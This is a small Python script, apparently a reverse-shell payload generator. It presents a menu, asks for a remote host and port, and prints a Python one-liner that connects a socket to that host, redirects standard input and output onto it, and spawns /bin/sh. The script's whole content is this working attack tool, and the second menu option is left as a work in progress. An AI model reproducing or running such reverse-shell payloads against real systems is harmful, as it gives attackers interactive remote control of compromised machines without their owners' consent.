#!/usr/bin/env python3
import os

def menu():
    print('''
    ________MENU_________
    \n1. Python \n2. WIP
          ''')

def main():
    os.system("clear")

    menu()
    selectShell = int(input("Select Number:"))
    
    if selectShell == 1:
        rhost = input("RHOST= ")
        port = input("PORT= ")
        print("""python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'""".format(rhost, port))
    else:
        menu()
        main()

if __name__ == "__main__":
    main()
